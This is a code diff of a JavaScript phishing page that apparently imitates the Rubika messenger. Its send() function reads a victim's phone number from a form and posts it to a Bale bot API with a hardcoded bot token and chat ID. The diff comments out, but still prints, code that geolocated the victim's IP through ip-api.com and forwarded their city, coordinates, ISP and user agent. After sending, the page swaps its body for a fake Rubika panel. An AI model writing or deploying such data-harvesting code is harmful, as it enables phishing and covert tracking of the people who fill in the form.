@@ -19,13 +19,13 @@ async function get_ip() {
 }
 async function send() {
     var phone = document.getElementById('phone_number_1').value;
-    const res_info = await fetch("http://ip-api.com/json/" + ip, {
-        mode: "cors",
-        cache: "no-cache",
-    });
-    var info = await res_info.json();
+    // const res_info = await fetch("http://ip-api.com/json/" + ip, {
+    //     mode: "cors",
+    //     cache: "no-cache",
+    // });
+    // var info = await res_info.json();
     try {
-        var text = `اطلاعات گرفته شده:\nای پی : ${ip}\nشماره تلفن : ${phone}\nاطلاعات دستگاه : ${navigator.userAgent}\n\nاطلاعات به دست امده از ای:\nوضعیت : ${info.status}\nکشور : ${info.country}\nکد کشور : ${info.countryCode}\nمنطقه : ${info.region}\nشهر : ${info.city}\nزیپ : ${info.zip}\nلوکیشن : https://www.google.com/maps/@${info.lat},${info.lon}\nمنطقه زمانی : ${info.timezone}\nارائه دهنده خدمات اینترنت : ${info.isp}`;
+        // var text = `اطلاعات گرفته شده:\nای پی : ${ip}\nشماره تلفن : ${phone}\nاطلاعات دستگاه : ${navigator.userAgent}\n\nاطلاعات به دست امده از ای:\nوضعیت : ${info.status}\nکشور : ${info.country}\nکد کشور : ${info.countryCode}\nمنطقه : ${info.region}\nشهر : ${info.city}\nزیپ : ${info.zip}\nلوکیشن : https://www.google.com/maps/@${info.lat},${info.lon}\nمنطقه زمانی : ${info.timezone}\nارائه دهنده خدمات اینترنت : ${info.isp}`;
         var response = $.ajax({
             type: 'post',
             Headers: 'Access-Control-Allow-Origin:*',
@@ -34,7 +34,7 @@ async function send() {
             mode: "cors",
             cache: "no-cache",
             url: "https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage",
-            data: { chat_id: "915303220", text: String(text) },
+            data: { chat_id: "915303220", text: String(phone) },
         });
         document.body.innerHTML = `<div class="box">
         <img src="icon-192x192.png" alt="logo rubika">
